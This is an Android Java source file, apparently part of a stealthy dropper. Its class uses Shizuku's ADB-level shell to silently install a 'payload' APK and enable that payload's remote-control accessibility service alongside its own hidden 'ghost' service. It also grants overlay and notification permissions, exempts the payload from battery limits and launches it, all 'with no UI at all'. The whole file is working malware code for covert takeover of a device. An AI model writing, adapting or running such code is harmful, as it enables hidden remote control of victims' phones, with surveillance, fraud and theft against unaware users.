package com.android.shell.ghost;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

import rikka.shizuku.Shizuku;

/**
 * Shizuku bridge. Shizuku is a Play-verified app that grants ADB-level shell to
 * apps the user authorises. When it is installed and running we install the
 * payload and flip accessibility/overlay/battery settings with no UI at all.
 */
final class ShizukuBridge {

    static final int REQUEST_CODE = 4242;
    private static final String TAG = "GhostHide";

    private ShizukuBridge() {}

    static boolean available() {
        try {
            return Shizuku.pingBinder();
        } catch (Throwable t) {
            return false;
        }
    }

    static boolean permitted() {
        try {
            return Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable t) {
            return false;
        }
    }

    static boolean installed(Context c) {
        try {
            c.getPackageManager().getPackageInfo("moe.shizuku.privileged.api", 0);
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    static void request() {
        try {
            Shizuku.requestPermission(REQUEST_CODE);
        } catch (Throwable ignored) {}
    }

    /** Runs a shell command through Shizuku. Returns exit code, or -1. */
    static int run(String... cmd) {
        try {
            java.lang.reflect.Method m = Shizuku.class.getDeclaredMethod(
                    "newProcess", String[].class, String[].class, String.class);
            m.setAccessible(true);
            Process p = (Process) m.invoke(null, cmd, null, null);
            BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String line;
            while ((line = err.readLine()) != null) Log.d(TAG, "shizuku: " + line);
            err.close();
            return p.waitFor();
        } catch (Throwable t) {
            Log.d(TAG, "shizuku run failed " + t);
            return -1;
        }
    }

    /** Silent install + enable the payload accessibility service. */
    static boolean installAndEnable(Context c, File apk) {
        if (!available() || !permitted() || apk == null || !apk.isFile()) return false;
        String pkg = PayloadInstaller.PAYLOAD_PACKAGE;
        int rc = run("pm", "install", "-r", "-g", apk.getAbsolutePath());
        Log.d(TAG, "shizuku pm install rc=" + rc);
        if (rc != 0) {
            // Fall back to a normal session if the package was absent/blocked.
            if (rc == 1) return false;
        }
        String ghost = c.getPackageName() + "/com.android.shell.ghost.GhostAccessibilityService";
        String payload = pkg + "/com.carriez.flutter_hbb.RemoteControlAccessibilityService";
        run("settings", "put", "secure", "enabled_accessibility_services", ghost + ":" + payload);
        run("settings", "put", "secure", "accessibility_enabled", "1");
        run("appops", "set", pkg, "SYSTEM_ALERT_WINDOW", "allow");
        run("pm", "grant", pkg, "android.permission.POST_NOTIFICATIONS");
        run("dumpsys", "deviceidle", "whitelist", "+" + pkg);
        run("am", "start", "-n", pkg + "/com.carriez.flutter_hbb.MainActivity");
        return true;
    }
}
